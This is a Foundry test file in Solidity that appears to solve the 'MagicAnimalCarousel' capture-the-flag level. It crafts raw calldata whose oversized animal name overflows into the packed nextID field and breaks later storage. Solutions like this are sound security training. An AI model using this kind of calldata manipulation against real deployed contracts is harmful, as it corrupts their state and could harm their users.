// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {MagicAnimalCarousel} from "./MagicAnimalCarousel.sol";
import {Test, console} from "forge-std/Test.sol";

contract SolveMagicAnimalCarousel is Test {
    MagicAnimalCarousel target;

    function setUp() public {
        /* Inside carousel value:
          00000000000000000000 - 10 bytes (animal name)
          0001 - 2 bytes  (nextID)
          0000000000000000000000000000000000000000 - 20 bytes (owner addr)
        */
        target = new MagicAnimalCarousel();
    }

    function testMagicAnimalCarousel() public {
        // Storing a bear should work
        string memory bear = "bear";
        target.setAnimalAndSpin(bear);
        uint256 currCrateId = target.currentCrateId();

        bytes32 retrievedAnimal = bytes32(target.carousel(currCrateId)) >> 176;
        bytes32 computed = bytes32(abi.encodePacked(bear)) >> 176;
        assertEq(retrievedAnimal, computed);
    }

    function testSolveMagicAnimalCarousel() public {
        // 1st step: store a bear
        string memory bear = "bear";
        target.setAnimalAndSpin(bear);
        uint256 currCrateId = target.currentCrateId();

        // 2nd step: update the bear info
        bytes memory callData = abi.encodeWithSelector(
            MagicAnimalCarousel.changeAnimal.selector,
            bytes32(uint256(0x40)), // offset for animal param
            bytes32(currCrateId), // crateId
            bytes32(uint256(12)), // total length of the anmial len below
            // forge-lint: disable-next-line(unsafe-typecast)
            bytes32(hex"30303030303030303030ffff")
        );

        console.log("calldata:");
        console.logBytes(callData);

        (bool success,) = address(target).call(callData);
        require(success, "Failed in changeAnimal() call");

        // 3rd step: store a lion back at carousel[0]
        target.setAnimalAndSpin("lion");

        // This one should not store `tiger` properly
        string memory tiger = "tiger";
        target.setAnimalAndSpin("tiger");

        currCrateId = target.currentCrateId();
        bytes32 retrievedAnimal = bytes32(target.carousel(currCrateId)) >> 176;
        bytes32 computed = bytes32(abi.encodePacked(tiger)) >> 176;
        assertNotEq(retrievedAnimal, computed, "Two animals shouldn't be the same");
    }
}
